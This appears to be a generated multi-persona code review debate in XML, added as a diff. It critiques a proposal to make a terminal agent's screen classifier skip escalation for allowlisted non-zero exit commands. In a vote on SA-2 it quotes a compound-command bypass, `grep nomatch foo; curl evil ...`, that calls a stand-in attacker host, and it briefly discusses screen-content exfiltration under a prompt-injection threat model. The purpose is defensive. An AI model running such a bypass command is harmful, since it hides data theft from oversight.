@@ -1,0 +1,230 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<performance_engineer_debate round="1" persona="Performance Engineer" generated_at="2026-05-17T23:10:00Z">
+
+  <!-- =================================================================== -->
+  <!-- CHALLENGES TO PEER FINDINGS                                          -->
+  <!-- =================================================================== -->
+
+  <challenges>
+
+    <challenge id="PE-vs-AR-4" target="AR-4" stance="PARTIAL_PUSHBACK">
+      <peer_claim>AR-4: Adding `last_command` to classify() makes it a "god object" by smuggling shell-mode-specific lexicon into an app-type-agnostic primitive; recommends keeping the allowlist at the runner level.</peer_claim>
+      <my_objection>AR-4's architectural argument is correct in the abstract but the recommended fix (push allowlist to the runner) is actively worse on the performance axis. The runner-level fix means the *same* allowlist regex/shlex parse happens on every command execution unconditionally — including on `exit_code==0` paths where the parse cost is pure waste. Inside classify(), the parse can be gated behind `if exit_code is not None and exit_code != 0`, executing only on the (much rarer) failure path. AR-4 trades a clean-architecture win for a measurable hot-path tax. The "god object" smell is real but the right resolution is a `command_classifier.py` module imported into observation.py, not a relocation to the runner.</my_objection>
+      <evidence>
+        <ref>src/clive/observation/observation.py:82-89 — Branch 2 (exit_code==0) returns SUCCESS immediately, no parse cost.</ref>
+        <ref>src/clive/observation/observation.py:92-100 — Branch 3 is the only call site where INFORMATIONAL_NONZERO would fire. Gating parse here is free on the success path.</ref>
+      </evidence>
+      <verdict>AR-4 is RIGHT that the seam is being smuggled in, WRONG that the runner is the correct destination. The destination is a separate module.</verdict>
+    </challenge>
+
+    <challenge id="PE-vs-DA-3" target="DA-3" stance="REINFORCE">
+      <peer_claim>DA-3: 30% threshold is unjustified, asymmetric in cost, satisfiable by Hawthorne-effect scenario design (author picks both numerator and denominator).</peer_claim>
+      <my_objection>DA-3 is correct and complements PE-2 (which traced the 30% to a retired latency criterion) and PE-6 (which showed N=10 cannot statistically distinguish a 30% median shift). Adding to DA-3: the asymmetry is even sharper than stated. A false-quiet failure (e.g., real `make` failure silenced) cascades — the next-turn LLM operates on a wrong premise and emits commands predicated on success, multiplying the error. So the cost gate is a single-turn metric, the safety gate is a multi-turn cascade metric, and they are not commensurate. Equal-weight conjunction (`AND`) of the two as a merge gate is dimensional malpractice. The proposal's gate is satisfiable by selecting scenarios where the head and tail commute (`git diff --quiet` is the canonical such example) — but production traffic does not commute.</my_objection>
+      <evidence>
+        <ref>candidate_A.md:22 — strict AND of "-30% cost" and "missed_rate <= phase1".</ref>
+        <ref>PE-2 ref: phase1-report.md:47-50 — the 30% was originally a latency target.</ref>
+        <ref>PE-6 ref: phase1-report.md:24 — N=10 is the precedent.</ref>
+      </evidence>
+      <verdict>DA-3 is right, and the underlying problem is even worse: the gate's two terms are not even on the same time-scale (single-turn vs multi-turn).</verdict>
+    </challenge>
+
+    <challenge id="PE-vs-SA-2c" target="SA-2" stance="PARTIAL_PUSHBACK">
+      <peer_claim>SA-2(c): Under sandbox mode, `shlex.split(wrapped_cmd)[0] == "bash"`, never matches the allowlist, so "the optimization silently no-ops in the exact environment it most matters."</peer_claim>
+      <my_objection>SA-2(c)'s impact framing is wrong on direction. From a performance perspective, "silently no-ops under sandbox" is the SAFE failure mode — token spend reverts to today's baseline. The danger SA-2 raises elsewhere (compound-command silencing in part b) is the real cost. Calling no-op-under-sandbox "the exact environment it most matters" overstates: the proposal's headline target is the high-volume `git diff --quiet`-shaped traffic that fires in dev shells, not in sandboxed pipelines. So the right read is: under sandbox the optimization is inert (acceptable), under non-sandbox it's where the win must be measured AND where SA-2(b)'s compound-bypass risk is highest. SA-2(c) should be downgraded; SA-2(b) deserves more weight than SA-2 currently allocates.</my_objection>
+      <evidence>
+        <ref>runtime.py:77-86 — sandbox wrap prepends `bash run.sh` only when sandboxed=True; the default for shell panes is NOT sandboxed unless CLIVE_SANDBOX=1.</ref>
+        <ref>candidate_A.md:13 — proposal naturally reads as classifying the LLM-emitted (pre-wrap) command, since the wrap is internal to _send_agent_command.</ref>
+      </evidence>
+      <verdict>SA-2(b) [compound-command bypass] is HIGH severity. SA-2(c) [sandbox no-op] is LOW severity and an architectural feature, not a bug.</verdict>
+    </challenge>
+
+    <challenge id="PE-vs-DA-6" target="DA-6" stance="STRONG_REINFORCE">
+      <peer_claim>DA-6: Even after fixing DA-1 (inverting runner guards), the dominant cost drain on the `exit==0` path is the Branch 6 UNKNOWN catch-all, not non-zero exits. Command-awareness may be a category error — output shape, not command shape, is the lever.</peer_claim>
+      <my_objection>DA-6 is the strongest peer finding in the round and aligns with PE-1 / PE-4. From the performance axis: even if every other criticism is addressed (Branch 3 made reachable, allowlist made bulletproof, metric made measurable), the achievable token reduction is bounded by `P(Branch 3 fires) × E[tokens|Branch 3 escalates]` which the proposal has not measured. Meanwhile `P(Branch 6 fires) × E[tokens|Branch 6 escalates]` is unmeasured but plausibly larger because (a) Branch 6 is reachable today, (b) it catches the long tail of weird screen states which is structurally larger than the controlled-failure-exit-code set, and (c) every TUI-style command (`htop`, `vim`, `less`) leaves screen states Branch 6 cannot parse. The proposal's win ceiling is mathematically bounded by a probability mass the proposal never bothered to measure.</my_objection>
+      <evidence>
+        <ref>observation.py:124-130 — Branch 6 UNKNOWN catch-all returns needs_llm=True on every screen that doesn't match progress/marker/intervention.</ref>
+        <ref>observation.py:59-79 — Branch 1 (intervention patterns) is the other live escalation path.</ref>
+        <ref>codebase-analysis.md:36 — confirms Branch 3 is dead from the runners' perspective.</ref>
+      </evidence>
+      <verdict>DA-6 reveals the proposal optimizes a sub-dominant term. Even a perfect Branch 3 fix may yield single-digit-percent token reduction in real traffic.</verdict>
+    </challenge>
+
+    <challenge id="PE-vs-RE-4" target="RE-4" stance="REINFORCE">
+      <peer_claim>RE-4: Allowlist should be by (command, exit_code) pair, not (command, any-nonzero). git exit 128/129, grep exit 2, test exit 2 are real failures distinct from exit 1.</peer_claim>
+      <my_objection>RE-4 is correct and underscores a metric-design flaw PE-3 identified. The proposal cannot detect this kind of false-quiet because `missed_rate` measures L2 byte-event coverage, not classifier-decision accuracy. A test fixture that fires `git diff --quiet` from `/tmp` (exit 128, "not a git repo") and observes the classifier returning SUCCESS-informational would catch the bug RE-4 names, but the proposal's bench has no such scenario and no metric that would flag it. From the performance axis: the (cmd, exit) pair approach also lets us count the *distinct cardinality* of the allowlist — pair-based reduces ambiguity per entry which makes per-cmd benchmarking sane.</my_objection>
+      <evidence>
+        <ref>git documentation: exit 128 = fatal, 129 = usage; not informational.</ref>
+        <ref>grep documentation: exit 2 = error opening file; not informational.</ref>
+        <ref>PE-3 finding: missed_rate cannot detect this regression class.</ref>
+      </evidence>
+      <verdict>RE-4 is correct. Pair-based allowlist is mandatory; without it the proposal silently broadens silencing far beyond the documented intent.</verdict>
+    </challenge>
+
+  </challenges>
+
+  <!-- =================================================================== -->
+  <!-- REVISIONS TO MY PRIOR FINDINGS                                       -->
+  <!-- =================================================================== -->
+
+  <revisions>
+
+    <revision target="PE-5" change="DOWNGRADE">
+      <before>PE-5 severity: MEDIUM. shlex.split is a hot-path tax (~5-20us per call).</before>
+      <after>PE-5 severity: LOW (was MEDIUM). Confidence MEDIUM unchanged.</after>
+      <reason>RE-1 and SA-2(a) raised the same parse call but identified far more severe failure modes (ValueError/IndexError crashes that abort the turn) than my micro-cost framing. The crash issue dominates the performance issue: a crashed turn dumps the full screen to the LLM (~5-20k tokens), which is many orders of magnitude larger than the ~5us shlex cost I cited. The right framing is "shlex.split is unsafe on attacker-controlled input" (SA-2, RE-1), not "shlex.split is slow." I withdraw the cost-microbenchmark framing and defer to SA/RE on this.</reason>
+    </revision>
+
+    <revision target="PE-1" change="STRENGTHEN">
+      <before>PE-1: merge-gate metric is not computable; cost_tokens is hard-coded to zero in the bench.</before>
+      <after>PE-1 confidence: HIGH unchanged, severity: FATAL unchanged. Strengthened with AR-3 and DA-2 corroboration.</after>
+      <reason>AR-3 independently confirmed "aggregate() computes median_cost but only over scenarios fed by latency_bench.py which does not exercise ScreenClassifier escalation." DA-2 independently confirmed "scenarios measure L2 byte-stream event detection ... NONE of them issue a non-zero-exit shell command whose escalation would be suppressed." Three personas converging on the same instrumentation gap from independent vantage points elevates this from a single-persona finding to a consensus blocker. Adding to PE-1: the harness change needed is not just a new mode label and scenario class, but a new harness module — because latency_bench.py is structured around byte-stream replay (latency_bench.py:145, 249), not around running ScreenClassifier.classify() with synthetic (screen, exit_code, last_command) tuples.</reason>
+    </revision>
+
+    <revision target="PE-4" change="STRENGTHEN_AND_REFRAME">
+      <before>PE-4: Branch 3 is unreachable; proposal ships dead code; runners need rewiring.</before>
+      <after>PE-4 confidence: HIGH unchanged, severity: FATAL unchanged. Reframed: this is the SAME finding as AR-1 and DA-1, raised independently by three personas; it should be the gating issue for the entire proposal.</after>
+      <reason>AR-1 and DA-1 both surface the dead-code-path issue at the same line numbers I cited (interactive_runner.py:351, toolcall_runner.py:242-248). RE-6 also flags the runner-gate change as hidden in the "2 lines" estimate. Five-of-five independent verifications: this is not a quibble, it's the proposal's central factual error. Reframe: PE-4 should be cited first in any synthesis, not fourth. The proposal cannot deliver any token savings without runner-gate inversion, which itself is an architectural decision (do we want classify() to opine on errors?) that needs its own design pass.</reason>
+    </revision>
+
+    <revision target="PE-2" change="NUANCE">
+      <before>PE-2: 30% is a fossil from a retired latency criterion (severity FATAL).</before>
+      <after>PE-2 severity downgraded to HIGH (was FATAL). Confidence HIGH unchanged.</after>
+      <reason>On reflection, "wrong magnitude" is fixable by changing the number after baseline measurement, while "wrong axis" (PE-1) and "dead code" (PE-4) are architectural. PE-2 is a calibration issue, not a structural one. DA-3 made the same point with sharper framing (Hawthorne effect on author-curated scenarios). Calibration issues are HIGH not FATAL; they don't prevent merging in principle, they just require pre-PR baseline measurement. The FATAL-tier issues are PE-1, PE-3, PE-4.</reason>
+    </revision>
+
+    <revision target="PE-6" change="UNCHANGED_BUT_FLAG_INTERACTION">
+      <before>PE-6: N=10 is too small to detect a 30% median shift.</before>
+      <after>PE-6 confidence MEDIUM, severity LOW unchanged. Add interaction note: PE-6 only matters if PE-1 is fixed; today the comparison is zero-vs-zero so N is moot.</after>
+      <reason>PE-6 presumes the metric is measurable. Until PE-1 is resolved the metric is uniformly zero across all N, so increasing N changes nothing. PE-6 is downstream of PE-1; cite it only after PE-1's fix is scoped.</reason>
+    </revision>
+
+  </revisions>
+
+  <!-- =================================================================== -->
+  <!-- VOTES ON EVERY PEER FINDING                                          -->
+  <!-- =================================================================== -->
+
+  <votes>
+
+    <!-- ARCHITECTURE REVIEWER -->
+    <vote finding_id="AR-1" verdict="STRONG_AGREE">
+      <rationale>Identical to PE-4 and DA-1. Branch 3 is dead from the runners' perspective. Five-finding consensus across PE/AR/DA/RE makes this the dispositive blocker. AR-1's recommendation (option b: keep allowlist at runner) I challenge on perf grounds (see challenge PE-vs-AR-4) but the underlying observation is unimpeachable.</rationale>
+    </vote>
+
+    <vote finding_id="AR-2" verdict="AGREE">
+      <rationale>Toolcall result-dict schema lacks `command` field. Confirmed at toolcall_runner.py:75-81. The "2 line" estimate is off; this is a protocol change. AR-2's nuance about pre-wrap vs post-wrap command string is also correct and aligns with RE-6.</rationale>
+    </vote>
+
+    <vote finding_id="AR-3" verdict="STRONG_AGREE">
+      <rationale>Independent confirmation of PE-1. The bench cannot measure what the proposal claims it measures. AR-3's recommendation (decouple bench from PR, land classifier behind a flag with unit tests, build bench as follow-up) is the cleanest path.</rationale>
+    </vote>
+
+    <vote finding_id="AR-4" verdict="PARTIAL_AGREE">
+      <rationale>Architectural critique correct, recommended fix flawed on performance grounds. See challenge PE-vs-AR-4. The seam smell is real; the runner is the wrong destination. A separate `command_classifier.py` module is the correct architecture: keeps classify() pane-agnostic, keeps the parse gated to the failure path, makes the lexicon swappable per pane.</rationale>
+    </vote>
+
+    <vote finding_id="AR-5" verdict="AGREE">
+      <rationale>Consistency with CLIVE_STREAMING_OBS / CLIVE_SPECULATE precedent is architecturally cheaper than absence. The asymmetric cost of false-quiet (silent task failure) warrants a runtime kill switch. Negligible perf overhead from one os.getenv at module load.</rationale>
+    </vote>
+
+    <vote finding_id="AR-6" verdict="STRONG_AGREE">
+      <rationale>shlex.split[0] cannot match multi-token entries; the proposal's matcher is under-specified. Aligns with RE-2, RE-3, RE-5, SA-2, SA-3. Six findings across four personas converge on "the matcher is wrong" — this is consensus.</rationale>
+    </vote>
+
+    <!-- SECURITY ANALYST -->
+    <vote finding_id="SA-1" verdict="AGREE">
+      <rationale>The screen-content-exfil framing is plausible under prompt-injection threat model documented in byollm-delegate.md. Performance angle: the proposed mitigation (re-scan tail for secrets even on allowlist hit) reintroduces a regex cascade on the supposed-fast path, but it's necessary. The "drop pgrep from seed list" recommendation is cheap and right.</rationale>
+    </vote>
+
+    <vote finding_id="SA-2" verdict="STRONG_AGREE">
+      <rationale>Three concrete crash/bypass modes (ValueError, IndexError, compound-command-bypass) are all real. Aligns with RE-1, RE-3. The compound-bypass case (`grep nomatch foo; curl evil ...` silenced as informational) is the highest-severity bug in the entire proposal — it converts the optimization into a covert-channel primitive. Partial pushback on SA-2(c) framing only (see challenge PE-vs-SA-2c); SA-2(a) and SA-2(b) are dispositive.</rationale>
+    </vote>
+
+    <vote finding_id="SA-3" verdict="AGREE">
+      <rationale>`shlex.split[0] == "git"` is too coarse — would silence `git push` rejection, `git commit` hook failures, `git fetch` auth failures (exit 128). The implementation ambiguity in the proposal between "first-token match" and "prefix match" must be resolved before merge. Aligns with AR-6, RE-4.</rationale>
+    </vote>
+
+    <vote finding_id="SA-4" verdict="AGREE">
+      <rationale>`test` and `[` are filesystem/credential probes; silencing their failure exit is a recon-loop enabler. Performance angle: keeping `test`/`[` in the allowlist saves negligible tokens (these commands produce no stdout/stderr typically) while opening a large risk surface. Cost/benefit is unfavorable — drop them.</rationale>
+    </vote>
+
+    <vote finding_id="SA-5" verdict="WEAK_AGREE">
+      <rationale>Future-leak hypothesis is reasonable but speculative. The proposal as written does not put `last_command` in ScreenEvent.summary. Worth flagging for the v2 decision-log work, not a blocker for v1. Low severity, useful guardrail.</rationale>
+    </vote>
+
+    <vote finding_id="SA-6" verdict="AGREE">
+      <rationale>Bench has no adversarial scenarios. Aligns with PE-3 (missed_rate is the wrong metric), PE-6 (sample size), DA-3 (author-curated corpus). The 4 negative scenarios SA-6 lists are the minimum bar. Without them the falsifiability claim is hollow.</rationale>
+    </vote>
+
+    <!-- RELIABILITY ENGINEER -->
+    <vote finding_id="RE-1" verdict="STRONG_AGREE">
+      <rationale>shlex.split crashes are real (ValueError on unbalanced quotes, IndexError on empty string). LLM-emitted commands frequently mis-quote (MEMORY.md confirms). Crash dumps the screen, costing thousands of tokens — far worse than the proposal's intended optimization. Aligns with SA-2(a). Wrap in try/except is mandatory.</rationale>
+    </vote>
+
+    <vote finding_id="RE-2" verdict="AGREE">
+      <rationale>Wrapper-prefix issue is real: `sudo`, `time`, `env`, `nice`, `nohup`, `stdbuf`, `xargs`, etc. all break first-token matching. The "safe miss" framing is correct (wrappers escalate, which is the conservative default) but the proposal's headline claim of a 30% win evaporates if every common wrapper bypasses the allowlist. Real shell traffic uses these idioms heavily.</rationale>
+    </vote>
+
+    <vote finding_id="RE-3" verdict="STRONG_AGREE">
+      <rationale>Pipelines, &&, ||, subshells, command substitution all break first-token matching. The compound case (`grep foo && build.sh` where build.sh fails) silences a real build failure as "informational non-zero" — this is the SA-2(b) scenario from another angle. Recommendation to reject any unquoted shell metacharacter is correct and minimal.</rationale>
+    </vote>
+
+    <vote finding_id="RE-4" verdict="STRONG_AGREE">
+      <rationale>(command, exit_code) pair allowlist is mandatory. exit 128/129/137/143 are real failures across the board; treating "any non-zero" as informational is over-broad. See challenge PE-vs-RE-4. The proposal silently broadens its silencing far past the documented intent.</rationale>
+    </vote>
+
+    <vote finding_id="RE-5" verdict="AGREE">
+      <rationale>Test-mode vs inspect-mode distinction is correct. `grep -q` is a test, `grep` is an inspection — they have different reliability profiles. Requiring the quiet flag is the right scoping. Performance angle: smaller allowlist = fewer matches = lower per-turn parse cost, so this is strictly better on perf too.</rationale>
+    </vote>
+
+    <vote finding_id="RE-6" verdict="AGREE">
+      <rationale>Provenance gap between LLM-emitted cmd and actually-executed cmd is real. Under sandbox the exit code may be run.sh's, not the inner command's. The proposal must explicitly skip the allowlist (or mark conservative) under sandbox, and the runner-gate change RE-6 surfaces is the same blocker PE-4/AR-1/DA-1 identified — RE-6's "2 lines is a lie" framing is precisely correct.</rationale>
+    </vote>
+
+    <!-- DEVIL'S ADVOCATE -->
+    <vote finding_id="DA-1" verdict="STRONG_AGREE">
+      <rationale>Identical to PE-4 and AR-1. The proposal's central factual claim is wrong. With three independent verifications this is dispositive. Nothing further to add.</rationale>
+    </vote>
+
+    <vote finding_id="DA-2" verdict="STRONG_AGREE">
+      <rationale>Identical to PE-1 and AR-3. The bench measures the wrong thing. With three independent verifications this is dispositive.</rationale>
+    </vote>
+
+    <vote finding_id="DA-3" verdict="STRONG_AGREE">
+      <rationale>Author-curated corpus + uncalibrated threshold + asymmetric cost gates = goal-aligned-target-dressed-as-falsifiable. See challenge PE-vs-DA-3 for amplification: the two terms of the AND gate are not even on the same time-scale.</rationale>
+    </vote>
+
+    <vote finding_id="DA-4" verdict="WEAK_AGREE">
+      <rationale>The 3-2 vote and non-convergence are factual but DA-4 may over-read the dispositional signal. judge-panel sensitivity analysis is hard; the right response is "treat round-3 winner as a hypothesis, not a verdict" — which is consistent with shipping behind a flag (AR-5). Useful caution, not blocking.</rationale>
+    </vote>
+
+    <vote finding_id="DA-5" verdict="WEAK_AGREE">
+      <rationale>Governance-doc proposal is reasonable but probably scope-creep for a single PR. The deeper observation — that INFORMATIONAL_NONZERO will accrete entries without an owner — is correct and aligns with AR-4's god-object critique. A short `docs/observation-policy.md` would address the long-term ownership concern at low cost; not a blocker for v1, but a strong recommendation.</rationale>
+    </vote>
+
+    <vote finding_id="DA-6" verdict="STRONG_AGREE">
+      <rationale>Best peer finding in the round. The proposal optimizes a sub-dominant term. Branch 6 UNKNOWN catch-all is reachable today and likely dominates the cost share; Branch 3 is unreachable today. Even after fixing the reachability bug, the proposal's win ceiling is bounded by an unmeasured probability mass. This is the finding that most undermines the proposal's value-proposition.</rationale>
+    </vote>
+
+  </votes>
+
+  <!-- =================================================================== -->
+  <!-- SYNTHESIS                                                            -->
+  <!-- =================================================================== -->
+
+  <synthesis>
+    <consensus_blockers>
+      <item>Branch 3 dead-code from runners (PE-4 / AR-1 / DA-1 / RE-6) — 4 personas.</item>
+      <item>Bench measures wrong thing (PE-1 / AR-3 / DA-2) — 3 personas.</item>
+      <item>Matcher under-specified, breaks on wrappers/compounds/quotes (AR-6 / RE-1 / RE-2 / RE-3 / SA-2 / SA-3) — 4 personas, 6 findings.</item>
+      <item>Allowlist must be (cmd, exit_code) pairs, not (cmd, any-nonzero) (RE-4 / SA-3 / SA-4) — 3 personas.</item>
+    </consensus_blockers>
+    <minority_signal>
+      DA-6 (Branch 6 UNKNOWN may dominate) is unique to DA but I strongly endorse it. If correct, the proposal's value ceiling is structurally bounded.
+    </minority_signal>
+    <recommended_verdict>
+      Proposal cannot merge in current form. Minimum bar: (a) include runner-gate inversion in scope and budget; (b) write the matcher first with a 20-form unit-test fixture before claiming the win; (c) gate behind CLIVE_CMDAWARE_CLASSIFIER per AR-5; (d) replace bench cost-token gate with a deterministic-fixture test until a real harness exists; (e) measure Branch 6 firing rate first to validate that Branch 3 is even worth optimizing (DA-6).
+    </recommended_verdict>
+  </synthesis>
+
+</performance_engineer_debate>
